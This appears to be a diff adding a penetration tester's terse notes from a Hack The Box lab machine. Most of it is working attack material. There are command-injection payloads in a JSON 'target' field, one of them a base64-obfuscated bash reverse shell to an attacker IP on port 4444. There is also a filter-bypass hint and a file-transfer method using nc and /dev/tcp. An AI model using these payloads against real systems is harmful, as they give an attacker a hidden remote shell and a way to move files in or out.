@@ -1,0 +1,17 @@
+{"target":"\";pwd \""}   json 
+{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
+
+
+
+/[which+bash 
+to bypass filter and execute shell
+
+in vi to replace char with something
+:%s/\\n/\n/g
+
+
+send file if nc ,curl etc not working
+
+on my pc :    nc -lvnp 4444 < rev.php
+on htb:     cat < /dev/tcp/10.10.14.10/4444 > rev.php  we get that file on our pc
+talkative htb box
